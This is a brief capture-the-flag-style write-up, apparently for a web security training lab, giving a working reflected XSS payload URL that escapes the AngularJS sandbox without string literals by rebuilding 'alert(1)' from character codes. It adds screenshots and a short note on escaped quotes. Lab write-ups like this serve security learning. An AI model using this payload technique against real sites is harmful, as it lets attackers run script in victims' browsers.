# EXPERT: Reflected XSS with AngularJS sandbox escape without strings

```jsx
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

![Снимок экрана 2025-12-01 в 10.38.36.png](EXPERT%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_10.38.36.png)

![Снимок экрана 2025-12-01 в 10.39.04.png](EXPERT%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_10.39.04.png)

Converting array to string is needed here because `“` and `‘` are properly escaped by the system.